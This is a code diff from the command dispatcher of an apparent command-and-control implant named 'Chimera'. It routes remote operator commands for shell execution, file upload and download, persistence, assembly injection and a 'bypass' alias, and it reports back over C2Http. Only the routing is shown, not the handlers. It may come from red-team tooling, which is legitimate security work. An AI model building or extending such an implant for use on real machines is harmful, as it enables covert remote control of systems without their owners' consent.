@@ -52,56 +52,49 @@ namespace Chimera
                     case "shell":
                         output = Commands.Shell.Execute(parameters);
                         break;
-
                     case "upload":
                         output = Commands.Upload.Execute(parameters, taskID, CallbackUUID);
                         break;
-
                     case "download":
                         output = Commands.Download.Execute(parameters, taskID, CallbackUUID);
                         break;
-
                     case "ls":
                         output = Commands.Ls.Execute(parameters);
                         break;
-
                     case "pwd":
                         output = Commands.Pwd.Execute();
                         break;
-
                     case "cd":
                         output = Commands.Cd.Execute(parameters);
                         break;
-
                     case "sleep":
                         output = Commands.Sleep.Execute(parameters);
                         break;
-
                     case "persist":
                         output = parameters != null && parameters.ToLower() == "remove"
                             ? Commands.Persist.Remove()
                             : Commands.Persist.Execute();
                         break;
-
                     case "inject_assembly":
                         output = Commands.InjectAssembly.Execute(parameters);
                         break;
-
                     case "runas_exec":
+                        // Old, now serves as bypass command
                         output = Commands.RunasExec.Execute(parameters);
                         break;
-
+                    case "bypass":
+                        // Legacy alias
+                        output = Commands.RunasExec.Execute(parameters);
+                        break;
                     case "help":
                         output = Commands.Help.Execute();
                         break;
-
                     case "kill":
                         output = Commands.Kill.Execute();
                         C2Http.PostResponse(CallbackUUID, taskID, "Agent terminating.");
                         if (output == "__KILL__")
                             Environment.Exit(0);
                         return;
-
                     default:
                         output = $"Unknown command: {command}";
                         break;
